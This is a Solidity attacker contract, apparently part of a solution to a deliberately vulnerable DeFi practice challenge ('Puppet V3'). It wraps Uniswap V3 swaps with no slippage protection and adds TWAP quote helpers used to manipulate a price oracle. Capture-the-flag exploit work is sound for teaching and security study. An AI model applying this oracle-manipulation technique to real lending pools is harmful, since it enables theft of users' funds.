pragma solidity =0.7.6;
pragma abicoder v2;

import "./PuppetV3Pool.sol";
import "@uniswap/v3-core/contracts/interfaces/IERC20Minimal.sol";
import "hardhat/console.sol";

import "@uniswap/v3-periphery/contracts/libraries/OracleLibrary.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";

interface ISwapRouter {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    /// @notice Swaps amountIn of one token for as much as possible of another token
    /// @param params The parameters necessary for the swap, encoded as ExactInputSingleParams in calldata
    /// @return amountOut The amount of the received token
    function exactInputSingle(
        ExactInputSingleParams calldata params
    ) external payable returns (uint amountOut);

    struct ExactInputParams {
        bytes path;
        address recipient;
        uint deadline;
        uint amountIn;
        uint amountOutMinimum;
    }

    /// @notice Swaps amountIn of onex token for as much as possible of another along the specified path
    /// @param params The parameters necessary for the multi-hop swap, encoded as ExactInputParams in calldata
    /// @return amountOut The amount of the received token
    function exactInput(
        ExactInputParams calldata params
    ) external payable returns (uint amountOut);
}

contract AttackerPuppet3 {
    PuppetV3Pool pool;
    IERC20Minimal token;
    IERC20Minimal weth;
    IUniswapV3Pool uniswapPool;

    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    uint32 constant TWAP_PERIOD = 10 minutes;
    uint24 constant FEE = 3000;

    constructor (PuppetV3Pool pool_, IUniswapV3Pool uniswapPool_, IERC20Minimal token_, IERC20Minimal weth_) {
        pool = pool_;
        uniswapPool = uniswapPool_;
        token = token_;
        weth = weth_;
        token.approve(address(router), type(uint256).max);
        weth.approve(address(router), type(uint256).max);
    }

    function swapDVTWETH(uint amount) external returns(uint amountOut) {
        token.transferFrom(msg.sender, address(this), amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(token),
            tokenOut: address(weth),
            fee: FEE,
            recipient: address(msg.sender),
            deadline: block.timestamp,
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uint amountOut = router.exactInputSingle(params);
    }

    function swapWETHDVT(uint amount) external returns(uint amountOut) {
        weth.transferFrom(msg.sender, address(this), amount);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
            tokenIn: address(weth),
            tokenOut: address(token),
            fee: FEE,
            recipient: address(msg.sender),
            deadline: block.timestamp,
            amountIn: amount,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        uint amountOut = router.exactInputSingle(params);
    }

    function tokenToWETH(uint128 amount) external view returns (uint256) {
        (int24 arithmeticMeanTick,) = OracleLibrary.consult(address(uniswapPool), TWAP_PERIOD);
        return OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            amount, // baseAmount
            address(token), // baseToken
            address(weth) // quoteToken
        );
    }

    function wethToToken(uint128 amount) external view returns (uint256) {
        (int24 arithmeticMeanTick,) = OracleLibrary.consult(address(uniswapPool), TWAP_PERIOD);
        return OracleLibrary.getQuoteAtTick(
            arithmeticMeanTick,
            amount, // baseAmount
            address(weth),
            address(token)
        );
    }
}